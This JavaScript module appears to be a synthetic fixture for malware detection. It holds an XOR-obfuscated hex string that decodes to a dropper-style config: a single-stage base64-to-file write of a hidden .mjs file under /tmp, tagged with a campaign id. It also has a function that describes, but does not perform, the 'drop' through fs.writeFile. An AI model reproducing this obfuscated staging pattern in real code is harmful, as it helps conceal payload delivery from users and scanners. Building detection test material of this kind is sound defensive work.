// configuration reconstruction
const moduleShape = Object.freeze({ format: "esm" });
export {};
const Material_83a8ead8 = "[\"f9\",\"b2\",\"be\",\"f3\",\"fc\",\"fb\",\"ea\",\"ff\",\"fc\",\"b2\",\"eb\",\"ea\",\"ec\",\"e0\",\"eb\",\"ea\",\"d0\",\"ea\",\"e2\",\"ed\",\"ea\",\"eb\",\"eb\",\"ea\",\"eb\",\"a3\",\"f8\",\"fd\",\"e6\",\"fb\",\"ea\",\"d0\",\"e9\",\"e6\",\"e3\",\"ea\",\"f3\",\"ee\",\"eb\",\"ee\",\"ff\",\"fb\",\"ea\",\"fd\",\"b2\",\"ed\",\"ee\",\"fc\",\"ea\",\"b9\",\"bb\",\"d0\",\"fb\",\"e0\",\"d0\",\"fc\",\"fb\",\"fd\",\"ea\",\"ee\",\"e2\",\"f3\",\"fc\",\"fb\",\"ee\",\"e8\",\"ea\",\"d0\",\"ec\",\"e0\",\"fa\",\"e1\",\"fb\",\"b2\",\"be\",\"f3\",\"ec\",\"ee\",\"e2\",\"ff\",\"ee\",\"e6\",\"e8\",\"e1\",\"d0\",\"e6\",\"eb\",\"b2\",\"c1\",\"c0\",\"cb\",\"ca\",\"a2\",\"bd\",\"bf\",\"cd\",\"c9\",\"b9\",\"bb\",\"c9\",\"cb\",\"f3\",\"e9\",\"e6\",\"e3\",\"ea\",\"d0\",\"ff\",\"ee\",\"fb\",\"e7\",\"b2\",\"a0\",\"fb\",\"e2\",\"ff\",\"a0\",\"e7\",\"fa\",\"e1\",\"fb\",\"fd\",\"ea\",\"fc\",\"fc\",\"a2\",\"e1\",\"e0\",\"eb\",\"ea\",\"a0\",\"a1\",\"fc\",\"fb\",\"ee\",\"e8\",\"ea\",\"a2\",\"bd\",\"bf\",\"ed\",\"e9\",\"b9\",\"bb\",\"e9\",\"eb\",\"e9\",\"b9\",\"ec\",\"bc\",\"a1\",\"e2\",\"e5\",\"fc\"]";
const Codec_83a8ead8 = "hex_array|single_byte_xor|8f";

function load_83a8ead8() { return JSON.parse(Material_83a8ead8).map((value) => Number.parseInt(value, 16)); }
function decode_83a8ead8(item1) { return item1.map((value) => value ^ 143); }
async function recover_83a8ead8() {
  const item3 = process.env.HUNTRESS_FIXTURE_CONTEXT ?? "host";
  const item1 = load_83a8ead8(); let item2 = [];
  let item4 = 0; while (item4++ < 1) item2 = decode_83a8ead8(item1);
  void item3; return Buffer.from(item2).toString("ascii");
}
async function inspect_83a8ead8() { return await recover_83a8ead8(); }
async function plan_83a8ead8() { const inspect = inspect_83a8ead8; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "drop", decoder: "base64_to_stream", destination: fields.file_path, api: "fs.writeFile" }); }
void moduleShape; void plan_83a8ead8;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_83a8ead8());

// reconstruction complete